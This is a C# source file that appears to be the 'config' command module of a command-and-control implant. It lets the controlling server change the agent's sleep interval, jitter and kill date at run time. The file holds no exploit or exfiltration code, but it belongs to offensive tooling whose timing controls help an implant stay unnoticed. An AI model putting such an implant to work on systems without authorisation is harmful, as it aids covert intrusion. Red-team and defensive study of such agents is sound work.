using Agent.Interfaces;
using Agent.Models;
using Agent.Utilities;
using System.Text;
using System.Text.Json;

namespace config
{
    public class Config : IPlugin
    {
        public string Name => "config";
        public IAgentConfig config { get; set; }
        public IMessageManager messageManager { get; set; }
        public ILogger logger { get; set; }
        public ITokenManager tokenManager { get; set; }

        public Config(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager)
        {
            this.messageManager = messageManager;
            this.config = config;
            this.logger = logger;
            this.tokenManager = tokenManager;
        }

        public async Task Execute(ServerJob job)
        {
            ConfigUpdateArgs args = JsonSerializer.Deserialize<ConfigUpdateArgs>(job.task.parameters);
            try
            {
                StringBuilder sb = new StringBuilder();

                if(args.sleep != -1)
                {
                    config.sleep = args.sleep;
                    sb.AppendLine($"Updated sleep interval to {config.sleep}");
                }

                if(args.jitter != -1)
                {
                    config.jitter = args.jitter;
                    sb.AppendLine($"Updated jitter interval to {config.jitter}");
                }

                if(args.killdate != DateTime.MinValue)
                {
                    config.killDate = args.killdate;
                    sb.AppendLine($"Updated killdate to {config.killDate}");
                }

                await messageManager.Write(sb.ToString(), job.task.id, true, "");

            }
            catch (Exception e)
            {
                await messageManager.Write(e.ToString(), job.task.id, true, "error");
            }
        }
    }
}
